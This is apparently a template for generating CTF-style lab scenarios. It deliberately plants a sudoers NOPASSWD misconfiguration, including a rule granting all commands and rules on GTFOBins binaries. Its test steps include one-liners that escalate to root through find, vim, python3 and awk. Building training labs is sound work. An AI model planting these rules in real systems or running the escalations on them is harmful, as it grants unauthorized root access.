---
id: sudoers_no_passwd
description: Grants a user the ability to run a specific command (or all commands) via sudo without a password, by adding a NOPASSWD entry to sudoers.
required_vars: [username, allowed_command]
---
# Atom: Sudoers NOPASSWD
A misconfigured sudoers rule allows a low-privilege user to run commands as root without knowing the root password—a classic and frequently exploited privilege escalation vector.

### Logic Requirements:
1. Ensure `sudo` is installed: `apt-get install -y sudo`
2. Append a NOPASSWD rule to `/etc/sudoers.d/<username>` (never edit `/etc/sudoers` directly):
   `echo "<username> ALL=(ALL) NOPASSWD: <allowed_command>" > /etc/sudoers.d/<username>`
3. Set correct permissions on the drop-in file: `chmod 440 /etc/sudoers.d/<username>`

### Common Patterns:
- **All Commands (maximally dangerous):**
  ```bash
  echo "operator ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers.d/operator
  chmod 440 /etc/sudoers.d/operator
  ```
- **Single Exploitable Binary (GTFOBins):**
  ```bash
  echo "developer ALL=(ALL) NOPASSWD: /usr/bin/vim" > /etc/sudoers.d/developer
  chmod 440 /etc/sudoers.d/developer
  ```
- **Script That Can Be Overwritten:**
  Combined with `cron_job_hijack` or `writable_systemd_service` — grant NOPASSWD on a script the attacker can also write to.
  ```bash
  echo "operator ALL=(ALL) NOPASSWD: /opt/deploy.sh" > /etc/sudoers.d/operator
  chmod 440 /etc/sudoers.d/operator
  ```

### Testing Guidance:
1. As the target user, verify sudo access: `sudo -l -U <username>` — should list the NOPASSWD rule.
2. Confirm passwordless execution: `sudo <allowed_command> --version` (or equivalent non-interactive check).
3. Verify privilege escalation by running `id` AS ROOT via the GTFOBin — do NOT spawn an interactive shell.
   The test MUST run a command and capture its output. Use the GTFOBin's exec/command-injection feature:
   - `find`: `sudo find /. -maxdepth 0 -exec id \;`  → expect `uid=0(root)`
   - `vim`: `sudo vim -c ':!id' -c ':q!'`             → expect `uid=0(root)`
   - `python3`: `sudo python3 -c 'import os; os.system("id")'` → expect `uid=0(root)`
   - `awk`: `sudo awk 'BEGIN{system("id")}'`           → expect `uid=0(root)`
   - `bash/sh` (NOPASSWD ALL): `sudo bash -c 'id'`    → expect `uid=0(root)`

   **NEVER** use patterns that spawn an interactive shell (`/bin/bash -p`, `bash -i`, `vim` without `:q!`)
   — these hang in non-TTY environments and produce no output to assert on.

### Synthesis Guidance:
Choose an `allowed_command` appropriate to the scenario's narrative. A "developer" user might have NOPASSWD on `git`, `pip`, or a deployment script. A "sysadmin" might have it on `systemctl` or `tcpdump`. For maximum CTF-style impact, pick a binary listed on GTFOBins (e.g. `find`, `vim`, `python3`, `awk`). Always use a drop-in file under `/etc/sudoers.d/` rather than editing `/etc/sudoers` directly.
